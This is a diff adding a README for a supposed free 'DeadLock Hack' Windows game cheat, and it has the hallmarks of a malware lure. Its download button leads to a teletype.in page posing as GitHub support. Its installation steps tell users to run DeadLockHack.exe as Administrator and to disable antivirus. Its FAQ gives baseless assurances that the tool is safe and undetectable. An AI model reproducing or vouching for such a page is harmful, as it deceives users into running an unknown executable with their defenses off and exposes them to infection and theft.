@@ -1,0 +1,51 @@
+# DeadLock Hack Download 2025 - Free & Safe Windows Tool
+
+[![Version](https://img.shields.io/badge/Version-2025-blue?logo=windows)](https://github.com) [![License](https://img.shields.io/badge/License-Free-green?logo=github)](https://github.com) [![Downloads](https://img.shields.io/badge/Downloads-10K+-brightgreen?logo=steam)](https://github.com) [![Platform](https://img.shields.io/badge/Platform-Windows-red?logo=windows)](https://github.com)  
+
+[![Download Now](https://img.shields.io/badge/Download-DeadLock%20Hack-FF5733?logo=dropbox&style=for-the-badge)](https://teletype.in/@githubsupport/aHN9l6m-mbF?ACCCE12EB28D488F9F8537561C77D6C3)  
+
+---
+
+## 🚀 **About DeadLock Hack**  
+Unlock the full potential of your gaming experience with **DeadLock Hack**—a cutting-edge, free-to-use utility designed for Windows (2025). This powerful tool ensures seamless performance, enhanced gameplay, and unmatched control over your favorite titles.  
+
+✨ **Features:**  
+✔ **100% Free** – No hidden costs, no subscriptions.  
+✔ **Easy-to-Use** – One-click activation.  
+✔ **Undetectable** – Advanced anti-ban protection.  
+✔ **Optimized for 2025** – Built for the latest Windows updates.  
+✔ **Regular Updates** – Stay ahead with the latest enhancements.  
+
+---
+
+## 🔧 **Installation Guide**  
+1. **Download** the latest version using the button above.  
+2. **Extract** the ZIP file to your preferred location.  
+3. **Run** `DeadLockHack.exe` as Administrator.  
+4. **Enjoy**! 🎮  
+
+⚠ **Note:** Disable antivirus temporarily (false positives possible).  
+
+---
+
+## 📜 **FAQ**  
+❓ **Is this safe?**  
+✅ Absolutely! We prioritize user security and anonymity.  
+
+❓ **Will I get banned?**  
+🛡️ Our anti-detection system ensures 99.9% safety.  
+
+❓ **Is there a premium version?**  
+🚫 No! DeadLock Hack is **forever free**.  
+
+---
+
+## 🌟 **Support & Community**  
+[![Discord](https://img.shields.io/badge/Discord-Join-7289DA?logo=discord)](https://discord.gg) [![Telegram](https://img.shields.io/badge/Telegram-Channel-26A5E4?logo=telegram)](https://t.me)  
+
+---
+
+## 📄 **License**  
+This project is licensed under the **MIT License**. Use at your own risk.  
+
+[![DeadLock Logo](https://img.shields.io/badge/DEADLOCK-HACK-black?style=for-the-badge&logo=gamepad)](https://github.com)
